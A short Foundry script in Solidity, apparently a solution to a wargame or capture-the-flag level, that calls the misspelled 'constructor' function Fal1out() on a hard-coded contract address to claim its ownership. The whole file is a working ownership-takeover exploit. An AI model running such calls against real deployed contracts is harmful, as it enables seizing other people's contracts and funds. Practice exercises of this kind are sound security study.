// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";

interface IFal1out {
    function Fal1out() external payable;
    function owner() external view returns (address payable);
}

contract DeployFal1out is Script {
    address constant private TARGET_ADDRESS = 0x6ADe51B1C8Fc77cbD2C89393b013650d14E9e6d9;
    
    function run() public {
        uint256 private_key = vm.envUint("PRIVATE_KEY");
        
        vm.startBroadcast(private_key);
        
        IFal1out target = IFal1out(TARGET_ADDRESS);
        target.Fal1out{value: 0 wei}();

        vm.stopBroadcast();
    }
}

